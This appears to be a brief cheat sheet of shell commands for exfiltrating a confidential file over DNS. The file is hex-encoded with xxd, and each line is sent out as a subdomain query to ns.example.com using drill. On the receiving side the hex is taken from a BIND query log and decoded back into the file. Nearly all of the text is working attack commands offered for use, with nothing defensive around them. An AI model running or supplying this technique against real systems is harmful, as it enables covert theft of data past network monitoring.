#choice the document which you want to exfiltrate
#Convert the information inside the document to hex:
xxd -p docname.txt > docname.hex

#prepare the content for exfiltration:
for line in `cat docname.hex` ; do drill $line.ns.example.com; done

#Within the for loop, the cat confidential.hex command is enclosed in the backticks (`) and is executed to display the file content. Each line of hex strings in the confidential.hex file is stored temporarily in the variable line. The content in the variable line is prepended to ns.example.com in the drill command. The drill command is designed to get information out of DNS.

#Combain the exfil. Data
egrep -o [0-9a-f]*.ns.example.com /var/lib/bind/query.log | cut -d. -f1 | uniq > secret.hex

#use scp for filext.. ~/ for hex

#convert hex to ascii
xxd -r -p secret.hex > secret.txt
